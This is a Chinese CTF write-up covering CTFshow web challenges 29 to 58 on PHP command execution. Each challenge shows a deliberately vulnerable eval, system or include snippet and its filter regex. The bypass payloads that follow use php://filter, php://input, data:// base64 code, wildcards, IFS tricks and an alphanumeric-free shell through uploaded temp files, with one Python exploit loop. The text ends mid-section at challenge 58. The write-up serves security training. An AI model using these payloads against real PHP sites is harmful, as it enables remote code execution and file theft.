---
title: "CTFshow web 命令执行"
date: 2022-07-08 17:02:29
disableNunjucks: true
---
# web 29

```php
 <?php
 
error_reporting(0);
if(isset($_GET['c']))
{
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);   //eval() 函数把字符串按照 PHP 代码来计算。
}
    
}
else
{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

`if(!preg_match("/flag/i", $c))`

preg_match 函数用于执行一个正则表达式。/i意味着不区分大小写。这句话的含义是不能使用flag而且忽略了大小写，这句话过滤了flag

## 二.解题过程：

### 方法一：

传入

`?c=echo "a"?><?php system("ls");`

可以发现有flag.php,结合伪协议可以将flag.php的内容给读出来

`?c=echo 'a '?><?php include"$_GET[url]";&url=php://filter/read=convert.base64-encode/resource=flag.php`

### 方法二：

1.首先查看一下php的版本，访问一下是7

`?c=phpinfo();`

2.接下来查看一下发现没有禁用函数

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08174928.png)

disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。（eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。）

3.列出当前目录的所有内容

`?c=print_r(scandir("./"));`

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08175421.png)

4.经过一系列的尝试发现可以采用写入文件的方法

`?c=system(“cat *php >>1.txt”); *php是后缀为php，本句的意思是将后缀为php的写入2.txt中`

5.之后访问/1.txt,即可得到flag

### 方法三：

涉及的知识点是**通用符**  
我们想要执行 cat flag.php，但是flag被过滤了,这时候就可以使用通配符  
cat f*表示打开当前目录下所有 f开头的文件

`?c=echo system('cat f*');`

# web 30

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

`if(!preg_match("/flag|system|php/i", $c))`

过滤了flag，system,php

## 二.解题过程：

### 方法一：

`?c=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php`

### 方法二：

反引号执行系统命令

```plaintext
?c=echo`cat * >> 1.txt`;
```

访问1.txt，即可得到flag

### 方法三：

反引号执行系统命令  
 使用通配符或*绕过过滤flag和php

```php
?c=echo `cat f*`;
```

# web 31

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

```plaintext
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))
```

过滤了flag,system,php,cat,sort,shell,空格,单引号，. 。

## 二.解题思路：

### 方法一：

1.涉及的知识点：

**空格过滤**

```plaintext
%09 符号需要php环境
{cat,flag.txt} 
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
kg=$'\x20flag.txt'&&cat$kg
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)
```

**cat过滤**

```plaintext
more:一页一页的显示档案内容
less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容。可以利用报错将文件内容带出来（-f<名称文件> 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）
```

2.我们可以构造playload:

```php
?c=echo(`tac%09f*`);
?c=echo(`tail%09f*`);
需要查看源码：
?c=echo(`nl%09f*`);
?c=echo(`less%09f*`);
?c=echo(`more%09f*`);
```

### 方法二:

采用include结合[伪协议](https://blog.csdn.net/nzjdsds/article/details/82461043)进行包含读取

> ?c=include”$_GET[url]”?>&url=php://filter/read=convert.base64-encode/resource=flag.php

# web 32

```php
 <?php
 
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09201640.png)

对以上进行了过滤

## 二.解题思路：

php中有很多不用括号的函数：

```php
<?php
echo 123;
print 123;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "etc/passwd";
?>
```

尝试`include"/etc/passwd"?>`可以执行，且代码没有过滤`$`，用c=include`"$_POST[x]"?>`或者c=include`"$_GET[x]"?>`然后用php伪协议将include包含的文件在页面上显示出来

```plaintext
?c=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

# web 33

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09204247.png)

对以上进行了过滤

## 二.解题思路：

### 方法一：

思路同上，但是本题过滤了单双引号

```plaintext
?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

### 方法二：

使用input伪协议

```plaintext
?c=include$_GET[url]?>&url=php://input 
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 34

```php
 <?php
 
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09214440.png)

对以上进行过滤

## 二.解题思路：

### 方法一：

思路同上，但是本题过滤了单双引号

```plaintext
?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

### 方法二：

使用input伪协议

```plaintext
?c=include$_GET[url]?>&url=php://input 
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 35

```php
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10131021.png)

过滤规则由上所示

## 二.解题思路

### 方法一：

同上：

```plaintext
?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

### 方法二：

使用input伪协议

```plaintext
?c=include$_GET[url]?>&url=php://input 
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 36

```php
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10132143.png)

对如上进行了过滤

## 二.解题思路：

### 方法一：

同上：

```plaintext
?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

### 方法二：

使用input伪协议

```plaintext
?c=include$_GET[url]?>&url=php://input 
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 37

```plaintext
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码:

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10133426.png)

过滤了如上的代码

文件包含

## 二.解题思路：

使用伪协议读flag。

`data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行`

### 方法一：

flag使用*绕过

```plaintext
?c=data://text/plain,<?php echo system('cat fl*');?>
?c=data://text/plain,<?php%20 system('cat fl*');?>
```

查看源码即可得到flag

### 方法二：

```plaintext
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

base64解码为`<?php system('cat flag.php');?>`  
 查看源码即可得到flag

### 方法三：

使用input伪协议进行读取

```plaintext
?c=php://input
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 38

```plaintext
 <?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-10134722.png)

对以上进行了过滤

## 二.解题思路：

### 方法一:

```plaintext
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

### 方法二：

使用input伪协议进行读取

```plaintext
?c=php://input
```

post部分：

```plaintext
<?php system("more flag.php"); ?>
```

# web 39

```php
 <?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

对flag进行了过滤，在进行包含的时候会加上php的后缀

## 二.解题思路：

我们可以试试伪协议，因为不能带有flag，所以filter协议和php://input也不好用了。data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用  
flag使用*绕过

```plaintext
?c=data://text/plain,<?php echo system('cat fl*');?>
?c=data://text/plain,<?php%20 system('cat fl*');?>
```

查看源码即可得到flag  
 这样就相当于执行了php语句`<?php system('cat f*')?>.php`

# web 40

```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11150938.png)

对以上进行了过滤。正则中的括号不是英文的 是过滤了中文的括号。

## 二.解题思路：

[无参数读文件和RCE总结](https://www.freebuf.com/articles/system/242482.html)

**涉及的知识点：**  
 读文件+数组改造

```
localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)
pos()：返回数组中的当前元素的值。
array_reverse()：数组逆序 scandir()：获取目录下的文件
next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过
pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。具体内容如下
```

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11152648.png)

我们的目标非常的明确，只需要将数组逆序然后将指针移动到下一个元素即可。

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11153136.png)

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11153307.png)

可以使用

`show_source(),readfile、highlight_file、file_get_contents`(readfile和file_get_contents读文件，显示在源码处)

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11154433.png)

# web 41

```php
 <?php

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?> 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-11154804.png)

对以上进行了过滤。

## 二.解题思路：

[羽大佬的wp](https://wp.ctf.show/d/137-ctfshow-web-web41)

# web 42

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

**>/dev/null 2>&1**主要意思是不进行回显的意思，可参考[Shell脚本———— /dev/null 2>&1详解](https://www.cnblogs.com/tinywan/p/6025468.html)

## 二.解题思路：

我们的目的是让命令回显，那么进行命令分隔即可。

```plaintext
; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
& //两条命令都会执行
&& //两条命令都会执行
```

可构造playload：

```plaintext
cat flag.php;
cat flag.php||
```

# web 43

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12204901.png)

代码对以上进行了过滤。

## 二.解题思路：

同上，

```plaintext
?c=more flag.php||
?c=sort flag.php||
?c=less flag.php||
?c=tac flag.php||
?c=tail flag.php||
?c=nl flag.php||
?c=strings flag.php||
```

等都可以进行绕过。

[命令执行绕过小技巧](https://www.cnblogs.com/NPFS/p/13279815.html)

# web 44

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12205258.png)

对以上进行了过滤。

## 二.解题思路：

使用通配符进行绕过即可。

```plaintext
?c=more fl''ag.php||
?c=more fla*.php||
?c=more ????.???||
```

# web 45

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

​ 

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12205730.png)

对以上加一个空格进行了过滤

## 二.解题思路：

空格绕过

```plaintext
`%09`(需要php环境)
`${IFS}`
`$IFS$9`
`{cat,flag.php}` //用逗号实现了空格功能
`%20`
 %09
 <>
 <
```

```plaintext
?c=more%09fla*.php||
```

# web 46

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12211936.png)

对以上进行了过滤

## 二.解题思路：

将空格过滤与通配符过滤结合一下

```plaintext
?c=more%09????.???||
```

# web 47

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12212418.png)

对以上进行了过滤。

增加了一些过滤

## 二.解题思路：

```plaintext
?c=strings%09????.???||
```

# web 48

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12212922.png)

过滤以上所示

## 二.解题思路：

```plaintext
?c=strings%09????.???||
```

# web 49

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12213420.png)

对以上进行了过滤

## 二.解题思路：

```plaintext
?c=tac%09????.???||
```

# web 50

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-12213717.png)

对以上进行了过滤

%09被过滤

<>和?同时使用不回显 所以用\代替？

## 二.解题思路：

```plaintext
?c=tac<>fla\g.php||
```

# web 51

```php
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-31164725.png)

对以上进行了过滤

## 二.解题思路：

```plaintext
?c=nl<fla\g.php||
```

# web 52

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01154408.png)

对以上进行了过滤

## 二.解题思路：

对我们的`<>`进行了过滤，我们可以使用`${IFS}`来代替空格

```plaintext
?c=nl${IFS}fla\g.php||
```

# web 53

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码：

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01155410.png)

过滤了以上内容。

## 二.解题思路：

`$IFS`符号如果是在当前目录读文件则中间要用’’来分隔一下  
 如果读其他路径下的如根目录 / 下的文件 则不用使用符分割  
 `$IFS`后边可以使用符号 但是不能直接跟字符 会显示无效命令  
 可构造playload：

```plaintext
?c=nl${IFS}????.???
```

# web 54

```plaintext
 <?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码:

增加了许多过滤，nl给过滤了

## 二.解题思路：

### 方法一：

使用vi读，

```plaintext
?c=vi${IFS}????.???
```

### 方法二：

`grep test *file` #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行

可构造playload：

```plaintext
?c=uniq${IFS}????.???
?c=grep${IFS}'{'${IFS}fl???php
（在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）
```

# web 55

```plaintext
 <?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码:

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-0162713.png)

可以看出过滤的非常多

## 二.解题思路：

### 方法一：

首先是/bin这个目录。  
bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等

这题利用/bin/base64  
base64这个命令就是将指定的文件的内容以base64加密的形式输出。  
因为过滤了字母，正好可以用64来匹配，最终payload如下：

```php
/???/????64 ????????
```

匹配的是`/bin/base64 flag.php`

### 方法二：

bzip2是linux下面的压缩文件的命令 [关于bzip2命令的具体介绍](https://www.runoob.com/linux/linux-comm-bzip2.html)  
 /usr/bin目录:

主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。

我们可以利用/usr/bin下的bzip2

意思就是说我们先将flag.php文件进行压缩，然后再将其下载  
payload：

```plaintext
?c=/???/???/????2 ????.???
也就是/usr/bin/bzip2 flag.php
```

# web 56

```plaintext
 <?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

## 一.分析代码:

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01164034.png)

过滤的范围更广了

## 二.解题思路：

利用了P神的无数字字母getshell：  
 [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

```plaintext
发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。
```

`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。

将命令写入文件后，可以利用点. 来执行文件中的命令，例如`. file`。也可以`source file`，但是这题过滤了字母，因此只能用点。

如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是`/???/????????[@-[]` ， `[@-[]`是通配符，用来表示大写字母。

写一个文件上传的前端：

```plaintext
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

上传一个txt文件，文件内容

```plaintext
#!/bin/sh
ls
```

注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径

上传抓包

抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01233816.png)

之后用cat指令读就可以

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-01234018.png)

或者运行以下脚本即可得到flag：

```python
import requests

while True:
    url = "http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
    if r.text.find("flag") > 0:
        print(r.text)
        break
```

# web 57

```php
 <?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码:

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-02154648.png)

过滤了以上的内容，同时提示我们flag in 36.php

## 二.解题思路：

取反：

```plaintext
首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0
所以: ~100 的二进制表示为：1001 1011 所以等号左边=1001 1011

再看右边
-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1=-x 所以，我们把101按位取反加一 先取反：
~101=10011010 再加一： ~101+1=10011011=-101 所以等号右边=10011011=左边，所以等号成立。
```

`双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。`

```plaintext
echo ${_} #返回上一次的执行结果
echo $(()) #0
echo $((~$(()))) #~0是-1
$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2
echo $((~-37)) #~-37是36
```

```plaintext
$(($((~$(())))$((~$(())))))==-2 //$((~$(())))==-1 中间有两个所以是-2 是相加的
```

那-37就需要中间有37个`$((~$(())))`

然后取反就是36

playload：

```plaintext
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

# web 58

```php
 <?php

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

## 一.分析代码:

如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。

